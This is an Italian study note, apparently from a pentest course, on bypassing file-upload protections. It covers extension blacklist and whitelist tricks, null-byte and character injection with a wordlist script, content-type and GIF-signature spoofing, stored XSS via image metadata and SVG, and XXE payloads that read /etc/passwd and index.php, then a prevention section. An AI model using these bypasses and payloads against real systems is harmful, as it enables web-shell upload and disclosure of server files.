# File Upload

Le protezioni possono essere di diversi tipi:

- validazione lato client
- estensioni in blacklist
- estensioni in withelist
- content-type e mime-type

Ognuna di queste protezioni ha il suo modo per essere agirata.

## Validazione lato client

La validazione lato client si agira molto facilmente, eliminando via "ispeziona elemento" gli stozzi di codice che bloccano la nostra richiesta.

## Blacklist

Questo pezzo di codice per esempio mette in blacklist le estensioni php, php7 e phps.

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```

Nota che la comparazione e' case-sensitive, quindi se sei su Windows puoi provare con un ".pHp" per esempio e dovrebbe passare. Poi la pagina la chiami cmq con ".php".

Per capire le esenzioni in blacklist possiamo fare un po di fuzing usando le seguenti liste:

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt

queste sono specifiche per php. Quando fai il fuzing con Burp ricordati di eliminare la spunta da "URL Encode" altrimenti codifica il "." nel nome del file e non va bene.
Da qui otteniamo la lista delle esenzioni concesse e dobbiamo trovare una che ci permette di eseguire codice. Quelle permesse vanno provate a mano, una per una.

## Whitelist

Le estensioni in whitelist si possono ottenere sempre con lo stesso fuzing.

Questo e' un esempio di codice che mette in whitelist le estensioni tipiche delle immagini.

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

Da notare che il check verifica solo che il nome del file contiene l'estensione voluta. Per esempio potremmo usare "shell.jpg.php" e dovrebbe passare e rimanere comunque eseguibile dal parte del webserver. Il problema qui e' l'espressione regolare scritta 'male'.

Migliorando di poco l'esressione regolare questo accatto (doppia estensione) fallisce

```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
```

perche' il check e' alla fine, e ".php.jpg" passa ma non e' piu' un file eseguibile per il webserver.

In php7.4 per apache2 c'e' lo stesso problema sulla configurazione delle estensioni eseguibili php

```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

e come si vede manca il $ per indicare che le estensioni in whitelist devono essere alla fine del nome.
Ad esempio "shell.php.jpg" passa la validazione corretta dell'applicazione e rimane eseguibile se il webserver ha questa misconfiguration.

Un altro metodo di agiramento delle withelist e' l'injection di caratteri. Esiste una lista di caratteri che si possono inserire nel nome del file per agirare i controlli: %20 %0a %00 %0d0a / .\ . … :

Ogniuno di questi ha un suo ambito specifico di utilizzo, per esempio shell.php%00.jpg funziona su PHP 5 o precedenti perche' il webserver tronca il nome del file dopo %00 e lo salva come shell.php, DOPO aver passato il controllo whitelist. Stessa cosa con shell.aspx:.jpg su server Windows.

Piccolo script per generare possibili nomi con i caratteri speciali

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

questa lista poi si puo' usare per fare fuzing.

## Content-type e MIME-type

Oltre al nome del file ci sono altri due controlli che si possono fare: il content-type nella richiesta e il mime-type del file.

Una richiesta HTTP per l'upload di un file ha due content-type, quello della richiesta in se, spesso `Content-Type: multipart/form-data;`, ed uno specifico per il file che si sta caricando, per esempio `Content-Type: application/x-php` nel corpo della richiesta. Quello che ci interessa modificare e' il secondo, solitamente.

Questo pezzo di codice controlla il content-type della richiesta

```php
$type = $_FILES['uploadFile']['type'];
if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

e mette in whitelist alcuni tipi di content-type di immagini.

Anche qui si puo' fare fuzing per capire quali sono concessi, la lista da usare e' questa:
https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt
Questa lista contiene 700 e passa elementi da testare. Se siamo sicuri che ci servono solo quelli delle immagini possiamo filtrarli con il seguente script:

```shell
$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/web/content-type.txt
$ cat content-type.txt | grep 'image/' > image-content-types.txt
```

ed utilizzare `image-content-types.txt` per il fuzing.

Altro controllo diffuso e' il check dei primi byte del file, la signature del file. Le immagini GIF hanno una signature legibile, moltri altri file no. Possiamo usare `GIF87a` o `GIF89a` all'inizio di un file per farlo passare per una GIF.

Il controllo sul mimetype e' il medesimo del contentype, cambia solo la fonte da checcare, in questo caso e' la funzione php `mime_content_type()` che estrare i primi byte del file.

```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

# Introduzione di XXS Stored con il caricamento di file

Possiamo manipolare l'immagine stessa e creare delle Stored-XSS. Si possono inserire dei commenti nelle immagini usando `exiftool` e se la pagina web li visualizza probabilmente esegue quel codice.

```shell
$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
$ exiftool HTB.jpg
...SNIP...
Comment                         :  "><img src=1 onerror=alert(window.origin)>
```

Oppure si puo' inserire uno stozzo di `js` in una `svg` (che e' un file `XML` di base).

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert("window.origin");</script>
</svg>

```

# Introduzione di XXE con il caricamento del file

Sempre con gli `svg` si puo' creare un payload ad hoc, per esempio

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

oppure

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

che ci restituisce il file `index.php` codificato in base64.

# Prevenzione

## Extension Validation

```php

$fileName = basename($_FILES["uploadFile"]["name"]);

// blacklist test
if (preg_match('/^.+\.ph(p|ps|ar|tml)/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// whitelist test
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

```

## Content Validation

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// whitelist test
if (!preg_match('/^.*\.png$/', $fileName)) {
    echo "Only PNG images are allowed";
    die();
}

// content test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!in_array($type, array('image/png'))) {
        echo "Only SVG images are allowed";
        die();
    }
}

```

## Directory

E' sempre meglio evitare di dare libero accesso alle cartelle di upload/download
E' preferibile far passare le richieste di download dal server, ad esempio scrivendo il nostro `dowload.php`. In questo caso pero' il nostro script di dowload deve:

- concedere l'accesso solo ai proprietari del file (per evitare vulnerabilità IDOR/LFI)
- evitare l'accesso diretto alla directory (per esempio, errore 403) Ciò può essere ottenuto utilizzando le intestazioni Content-Disposition e nosniff e utilizzando un'intestazione Content-Type accurata
- randomizzare i nomi dei file caricati
  - memorizzare i nomi originali "sanificati" in un database
  - quando lo script download.php deve scaricare un file, recupera il suo nome originale dal database e lo fornisce all'utente al momento del download
- memorizzare i file caricati in un server o contenitore separato

## Configurazione del server generica

- disabilitazione di funzioni specifiche che possono essere utilizzate per eseguire comandi di sistema attraverso l'applicazione web
  - Ad esempio, per farlo in PHP, si può usare la configurazione `disable_functions` in `php.ini` e aggiungere funzioni pericolose come `exec`, `shell_exec`, `system`, `passthru` e altre.
- disabilitare la visualizzazione degli errori di sistema o del server
- limitare la dimensione dei file
- aggiornare le librerie utilizzate
- eseguire una scansione dei file caricati per verificare la presenza di malware o stringhe dannose
- utilizzare un Web Application Firewall (WAF) come livello secondario di protezione
